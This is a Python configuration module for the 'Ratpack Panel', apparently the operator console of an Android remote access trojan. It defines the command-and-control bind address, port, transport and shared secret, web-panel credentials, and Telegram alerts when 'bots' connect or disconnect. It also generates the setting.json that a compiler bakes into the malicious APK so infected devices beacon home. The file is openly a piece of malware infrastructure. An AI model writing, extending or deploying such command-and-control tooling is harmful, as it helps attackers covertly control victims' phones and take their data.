"""
config.py — persistent configuration for the Ratpack Panel.

The configuration is a single JSON file (panel_config.json) next to the
package. It is created by the setup wizard and holds everything the panel
needs to survive a restart: the C2 bind address, the shared secret, the
web-interface address, the account credentials and the generated
setting.json.
"""

import json
import os
import secrets
import threading

_LOCK = threading.Lock()

DEFAULT_CONFIG_NAME = "panel_config.json"


def config_path() -> str:
    """Where the panel config lives."""
    override = os.environ.get("RATPACK_CONFIG")
    if override:
        return override
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(os.path.dirname(here), DEFAULT_CONFIG_NAME)


DEFAULTS = {
    "version": 1,
    "mode": "web",                  # web | bot
    "c2": {
        "bind": "0.0.0.0",           # where the C2 listens
        "host": "0.0.0.0",           # the address advertised to the bots
        "port": 8777,
        "protocol": "tcp",           # tcp | tls
        "transport": "tcp",          # tcp | http (http = shared hosting)
        "cert": "",
        "key": "",
    },
    "web": {
        "host": "127.0.0.1",
        "port": 8080,
        "username": "admin",
        "password": "",
    },
    "secret": "",
    "telegram": {
        "enabled": False,
        "token": "",           # from @BotFather
        "chat_id": "",         # your chat id
        "notify_online": True,
        "notify_offline": True,
        "notify_events": False,
    },
    "beacon_ms": 15000,
    "timeout_ms": 10000,
    "tag": "rat",
    "setting_json": {},
}


def load() -> dict:
    """Reads the config; returns the defaults when the file is missing."""
    path = config_path()
    with _LOCK:
        if not os.path.exists(path):
            return json.loads(json.dumps(DEFAULTS))
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, ValueError):
            return json.loads(json.dumps(DEFAULTS))
    merged = json.loads(json.dumps(DEFAULTS))
    merged.update(data)
    for key in ("c2", "web"):
        if isinstance(data.get(key), dict):
            merged[key].update(data[key])
    return merged


def save(cfg: dict) -> str:
    """Writes the config atomically."""
    path = config_path()
    with _LOCK:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
            f.write("\n")
        os.replace(tmp, path)
    return path


def bind_address(web: dict) -> str:
    """
    The address the panel socket is bound to.

    The configured host is the PUBLIC address: it goes into setting.json and
    into the URL the operator opens. Binding to it directly fails when the
    address is not assigned to this machine (a NAT address, a hostname that
    resolves elsewhere, a test address), so the socket is bound to every
    interface instead and the public address stays in the config.
    """
    host = (web or {}).get("host", "127.0.0.1")
    if host in ("0.0.0.0", "::", "127.0.0.1", "localhost"):
        return host
    return "0.0.0.0"


def is_configured() -> bool:
    cfg = load()
    return bool(cfg.get("secret")) and bool(cfg.get("mode"))


def generate_secret() -> str:
    return secrets.token_urlsafe(24)


def generate_password() -> str:
    return secrets.token_urlsafe(12)


def build_setting_json(cfg: dict) -> dict:
    """
    Builds the setting.json document that the compiler consumes.

    This is the contract between the panel and the compiler: the panel
    generates it, the operator downloads it and drops it into the compiler
    folder, the compiler bakes it into the APK.
    """
    c2 = cfg.get("c2", {})
    transport = c2.get("transport", "tcp")
    if transport not in ("tcp", "http"):
        transport = "tcp"
    host = c2.get("host", "0.0.0.0")
    if transport == "http":
        # The bots talk HTTP, so they need a URL, not host:port.
        if not host.startswith("http://") and not host.startswith("https://"):
            host = "http://" + host
    return {
        "version": 1,
        "generated_by": "Ratpack Panel",
        "generated_at": _now(),
        "server": {
            "host": host,
            "port": int(c2.get("port", 8777)),
            "protocol": c2.get("protocol", "tcp"),
            "transport": transport,
            "secret": cfg.get("secret", ""),
            "beacon_ms": int(cfg.get("beacon_ms", 15000)),
            "timeout_ms": int(cfg.get("timeout_ms", 10000)),
            "tag": cfg.get("tag", "rat"),
        },
    }


def _now() -> str:
    import datetime
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
